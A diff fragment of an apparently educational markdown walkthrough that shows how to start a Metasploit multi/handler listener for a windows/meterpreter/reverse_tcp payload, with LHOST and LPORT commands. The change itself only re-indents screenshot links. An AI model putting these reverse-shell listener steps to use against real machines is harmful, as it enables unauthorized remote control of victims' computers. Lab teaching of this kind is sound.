@@ -28,10 +28,10 @@ We now need to set up a listener on the port we determined within the executable
  
 The screenshot below shows what commands to issue within Metasploit. First, we’ll tell Metasploit to use the generic payload handler “multi/handler” using the command “use multi/handler”. We will then set the payload to match the one set within the executable using the command “set  payload windows/meterpreter/reverse_tcp”. We will then set the LHOST and LPORT this way — “set LHOST 192.168.47.152”and  “set  LPORT 4444”. Once done, type ```run``` or ```exploit```and press Enter.
 The screenshot below displays the output. The reverse TCP handler should begin waiting for a connection.
- ![image](https://github.com/user-attachments/assets/57dae01d-54fe-45e2-b071-0a04e5315e80)
+![image](https://github.com/user-attachments/assets/57dae01d-54fe-45e2-b071-0a04e5315e80)
 
 You can use show “options” command  to check if everything’s ok
- ![image](https://github.com/user-attachments/assets/3f18bc7f-c2b6-4388-9cb0-6219b44c6b09)
+![image](https://github.com/user-attachments/assets/3f18bc7f-c2b6-4388-9cb0-6219b44c6b09)
 
 
 If everything’s ok type run or exploit
